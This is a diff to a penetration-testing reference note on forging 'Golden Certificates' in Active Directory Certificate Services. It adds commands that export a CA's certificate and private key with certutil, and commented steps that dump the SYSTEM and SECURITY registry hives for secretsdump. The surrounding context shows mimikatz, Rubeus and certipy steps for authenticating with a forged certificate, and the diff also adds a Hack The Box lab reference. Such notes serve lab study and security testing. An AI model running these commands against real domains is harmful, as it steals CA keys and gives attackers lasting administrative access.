@@ -4,7 +4,7 @@ type: technique
 tags: [active-directory, adcs, certificates, persistence, reference-import, windows]
 phase: post-exploitation
 date_created: 2026-05-13
-date_updated: 2026-07-02
+date_updated: 2026-09-10
 sources: [InternalAllTheThings]
 ---
 
@@ -72,6 +72,16 @@ certutil -backupKey -f -p SuperSecurePassw0rd! C:\Windows\Tasks\CaBackupFolder
 mimikatz.exe "crypto::capi" "crypto::cng" "crypto::certificates /export"
 ```
 
+* On the CA server itself (certutil, serial from `certutil -dump`):
+
+```bash
+# On CA server: export CA cert and key
+certutil -exportPFX <CA_cert_serial> ca.pfx
+# or via backup privilege:
+# reg save HKLM\SYSTEM system.bak && reg save HKLM\SECURITY security.bak
+# secretsdump.py LOCAL ... to get CA key material
+```
+
 ## Forge Golden Certificates
 
 Forge a certificate of a target principal:
@@ -115,6 +125,8 @@ Rubeus.exe asktgt /user:Administrator /domain:dumpster.fire /certificate:<pfx-pa
 ```ps1
 certipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.10.10.10'
 ```
+
+HTB machine: Certificate (certificate.htb, ryan.k in Domain Storage Managers with SeManageVolumePrivilege used to reach the CA key material)
 
 ## References
 
